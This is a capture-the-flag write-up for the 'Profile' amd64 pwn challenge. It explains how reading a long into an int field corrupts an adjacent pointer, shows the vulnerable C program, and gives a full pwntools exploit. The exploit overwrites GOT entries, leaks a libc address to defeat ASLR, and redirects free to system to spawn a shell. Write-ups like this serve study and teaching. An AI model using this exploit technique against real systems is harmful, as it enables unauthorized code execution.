---
title: Profile
author: megachar0x01
date: 2023-10-09
categories: [Pwn, amd64, ctf]
---

The variable `age` is declared as an integer, and a long integer is obtained from the user. This means that, as an attacker, we have the capability to overwrite the next 4 bytes in memory. These next 4 bytes correspond to a pointer to a character array. As we examine the code, it becomes apparent that this character pointer is used to store user input. Combining these observations, we possess the ability to write anywhere in memory. 

To begin the attack, we first overwrite the Global Offset Table (GOT) entry for the `free` function with the address of the `main` function. This ensures that the program does not exit, creating a loop. The same process is applied to the `exit` function.

Next, our objective is to leak the value for the Libc library's base address in order to defeat Address Space Layout Randomization (ASLR). It is noted that regardless of the input provided, the program echoes it back. However, the `getline` function ensures that the buffer is null-terminated. Therefore, I identify an offset where the null character is replaced before printing. To achieve this, I replace the GOT entry for `strcspn` with the Procedure Linkage Table (PLT) entry of `puts`. Every time `strcspn` is invoked, the `puts` value will be updated in the GOT table. Subsequently, I write to the `puts` GOT table. When `strcspn` replaces the null character, the program prints the buffer, thereby leaking the `puts` value with respect to the Libc library loaded in memory.

Finally, the remaining steps are straightforward: I replace the `free` GOT table entry with that of the `system` function, and send `/bin/sh` as a string. With this, the shell is obtained. Boom, shell dropped!

## Potection

<img src="https://i.imgur.com/dB8TNrN.png" alt="img_1">

## Vuln Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

struct person_t {
  int id;
  int age;
  char *name;
};

void get_value(const char *msg, void *pval) {
  printf("%s", msg);
  if (scanf("%ld%*c", (long*)pval) != 1)
    exit(1);
}

void get_string(const char *msg, char **pbuf) {
  size_t n;
  printf("%s", msg);
  getline(pbuf, &n, stdin);
  (*pbuf)[strcspn(*pbuf, "\n")] = '\0';
}

int main() {
  struct person_t employee = { 0 };

  employee.id = rand() % 10000;
  get_value("Age: ", &employee.age);
  if (employee.age < 0) {
    puts("[-] Invalid age");
    exit(1);
  }
  get_string("Name: ", &employee.name);
  printf("----------------\n"
         "ID: %04d\n"
         "Name: %s\n"
         "Age: %d\n"
         "----------------\n",
         employee.id, employee.name, employee.age);

  free(employee.name);
  exit(0);
}

__attribute__((constructor))
void setup(void) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  srand(time(NULL));
}

```


## Exploit

```python
#!/usr/bin/python3
from pwn import *
import struct

# context.terminal = ['tmux','splitw','-h']
os.environ['XDG_CACHE_HOME'] = '/tmp/'

context.log_level = 'error'


info = lambda msg: log.info(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''

break *get_string+84
break *0x404140

continue
continue
continue
continue
continue
'''.format(**locals())

exe = './bin'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(elf,checksec=False)
libc = elf.libc ; libc_rop = ROP(libc,checksec=False)


io = start()

address = elf.got.free

sla(b"Age: ",str((address << 32) + 1))
sla(b"Name: ",p32(elf.sym.main)[:-1])

address = elf.got.exit

sla(b"Age: ",str((address << 32) + 1))
sla(b"Name: ",p32(elf.sym.main)[:-1])


address = elf.got.strcspn

sla(b"Age: ",str((address << 32) + 1))
sla(b"Name: ",p64(0x401040))

address = elf.got.puts

sla(b"Age: ",str((address << 32) + 1))
sla(b"Name: ",b"")


io.recvuntil(b"Name:")

leak_puts=u64(io.recvline().strip(b"\n")[1:]+b"\x00"*2)

print(f"Leaking Puts Value : {hex(leak_puts)}")

libc.address = leak_puts - libc.sym.puts

address = elf.got.free

sla(b"Age: ",str((address << 32) + 1))
sla(b"Name: ",p64(libc.sym.system))

sla(b"Age: ","1")
sla(b"Name: ",b"/bin/sh")

io.interactive()

```
